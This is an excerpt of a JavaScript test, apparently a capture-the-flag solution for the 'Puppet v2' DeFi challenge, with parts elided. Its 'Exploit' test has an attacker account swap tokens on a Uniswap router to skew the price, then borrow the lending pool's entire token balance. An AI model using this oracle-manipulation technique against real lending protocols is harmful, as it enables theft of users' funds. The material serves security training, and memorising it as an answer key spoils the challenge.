...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        const signedToken = await this.token.connect(attacker);
        await signedToken.approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        const signedRouter = await this.uniswapRouter.connect(attacker);
        await signedRouter.swapExactTokensForTokens(
        ...
        await signedWETH.approve(this.lendingPool.address, this.weth.balanceOf(attacker.address));

        const signedContract = await this.lendingPool.connect(attacker);
        await signedContract.borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
